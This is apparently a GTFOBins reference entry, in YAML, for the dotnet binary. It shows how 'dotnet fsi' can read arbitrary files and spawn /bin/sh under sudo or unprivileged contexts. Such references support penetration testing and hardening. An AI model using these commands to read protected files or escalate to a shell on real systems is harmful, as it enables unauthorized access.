<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/dotnet -->
---
functions:
  file-read:
  - code: |-
      dotnet fsi
      System.IO.File.ReadAllText("/path/to/input-file");;
    contexts:
      sudo:
      unprivileged:
  shell:
  - code: |-
      dotnet fsi
      System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
    contexts:
      sudo:
      unprivileged:
...
